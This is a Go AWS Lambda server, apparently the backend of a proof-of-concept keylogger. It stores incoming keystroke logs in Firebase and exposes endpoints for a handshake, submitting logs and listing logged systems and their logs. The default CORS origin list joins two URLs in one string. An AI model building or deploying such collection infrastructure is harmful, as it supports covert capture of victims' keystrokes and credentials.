package main

import (
	"context"
	"log"
	"os"

	"github.com/aws/aws-lambda-go/events"
	"github.com/aws/aws-lambda-go/lambda"
	ginadapter "github.com/awslabs/aws-lambda-go-api-proxy/gin"
	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

const MAX_LOG_CHARACTERS = 500
const DEFAULT_FIREBASE_SERVICE_ACCOUNT_FILE = "keylogger-poc-firebase-adminsdk-fbsvc-f8da15b4be.json"

var ginLambda *ginadapter.GinLambdaV2
var logSaver LogSaver

func init() {
	// Initialize Firebase
	serviceAccountKeyPath := os.Getenv("FIREBASE_SERVICE_ACCOUNT_KEY_PATH")
	if serviceAccountKeyPath == "" {
		serviceAccountKeyPath = DEFAULT_FIREBASE_SERVICE_ACCOUNT_FILE
		log.Printf("FIREBASE_SERVICE_ACCOUNT_KEY_PATH not set. Falling back to bundled file: %s", serviceAccountKeyPath)
	}
	if err := InitializeFirebase(serviceAccountKeyPath); err != nil {
		log.Fatalf("ERROR: Failed to initialize Firebase: %v", err)
	}
	logSaver = &FirebaseSaver{}

	// Load RSA keys from environment variables
	if err := loadKeysFromEnv(); err != nil {
		log.Fatalf("ERROR: Failed to load RSA keys: %v", err)
	}

	// Set up Gin router
	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.Use(gin.Recovery())

	// CORS configuration — override allowed origins via CORS_ALLOWED_ORIGINS env var (comma-separated)
	allowedOrigins := []string{"http://localhost:3000, https://keylogger-site.doypid.com"}
	if envOrigins := os.Getenv("CORS_ALLOWED_ORIGINS"); envOrigins != "" {
		allowedOrigins = splitOrigins(envOrigins)
	}

	router.Use(cors.New(cors.Config{
		AllowOrigins:     allowedOrigins,
		AllowMethods:     []string{"GET", "POST", "OPTIONS"},
		AllowHeaders:     []string{"Origin", "Content-Type", "Accept", "Authorization"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
	}))

	apiGroup := router.Group("/api")
	{
		apiGroup.GET("/handshake", handshakeHandler)
		apiGroup.POST("/log", logHandler)
		apiGroup.GET("/getSystems", getSystemsHandler)
		apiGroup.GET("/getLogs/:systemId/logs", getSystemLogsHandler)
	}

	ginLambda = ginadapter.NewV2(router)
}

func handler(ctx context.Context, req events.APIGatewayV2HTTPRequest) (events.APIGatewayV2HTTPResponse, error) {
	return ginLambda.ProxyWithContext(ctx, req)
}

func main() {
	lambda.Start(handler)
}

func splitOrigins(s string) []string {
	var origins []string
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == ',' {
			trimmed := trimSpace(s[start:i])
			if trimmed != "" {
				origins = append(origins, trimmed)
			}
			start = i + 1
		}
	}
	trimmed := trimSpace(s[start:])
	if trimmed != "" {
		origins = append(origins, trimmed)
	}
	return origins
}

func trimSpace(s string) string {
	start, end := 0, len(s)
	for start < end && s[start] == ' ' {
		start++
	}
	for end > start && s[end-1] == ' ' {
		end--
	}
	return s[start:end]
}
